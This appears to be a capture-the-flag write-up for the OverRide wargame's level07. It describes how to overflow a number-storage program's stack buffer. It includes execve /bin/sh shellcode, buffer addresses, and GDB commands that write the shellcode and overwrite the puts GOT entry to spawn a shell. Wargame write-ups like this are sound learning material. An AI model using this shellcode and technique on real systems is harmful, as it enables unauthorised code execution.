# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit 
Level07 

# Explanation
TODO check if we can write at a specific address?
TODO write somme shell or command inside of the nbs

Basically, the idea is:
- Write something using the store command in the buffer nbs, that's on the stack (each int makes 4 char)
- Redirect execution by rewriting the return address with the address of the buffer nbs using the store command

Max Index is 686 or 687:
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 686
 Index: 686
 Completed store command successfully
Input command: store 688
 Number: 688
 Index: 688
Segmentation fault (core dumped)
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 687
 Index: 687
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```


Start of the nbs buffer at: `0xffffd528`
```
0xffffd520:	0x00000000	0x00000000	0x41414141	0x00000000
```

Last address before segfault (`x/800x $esp`):
```
0xffffdfd0:	0x00000000	0x00000000	0x00000000	0x42424242
```


Shellcode: 
```
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

```
Shellcode:
0xe1f7c931 0x2f2f6851 0x2f686873 0x896e6962 0xcd0bb0e3 0x00000080
Addresses:
0xffffd528 0xffffd52c 0xffffd530 0xffffd534 0xffffd538 0xffffd53c
```

Performing the exploit with GDB:
```
(gdb) set {int}0xffffd528=0xe1f7c931
(gdb) set {int}0xffffd52c=0x2f2f6851
(gdb) set {int}0xffffd530=0x2f686873
(gdb) set {int}0xffffd534=0x896e6962
(gdb) set {int}0xffffd538=0xcd0bb0e3
(gdb) set {int}0xffffd53c=0x00000080
(gdb) info functions
...
0x080484c0  puts
0x080484c0  puts@plt
...
(gdb) disass 0x080484c0
Dump of assembler code for function puts@plt:
   0x080484c0 <+0>:	jmp    DWORD PTR ds:0x804a014
   0x080484c6 <+6>:	push   0x28
   0x080484cb <+11>:	jmp    0x8048460
End of assembler dump.
(gdb) x 0x804a014
0x804a014 <puts@got.plt>:	0xc0
(gdb) set {int}0x804a014=0xffffd528
(gdb) c
Continuing.
 Number: 1
 Index: 3
process 3693 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
```

# Resources
[Shellcode from kernel_panik](https://shell-storm.org/shellcode/files/shellcode-752.html)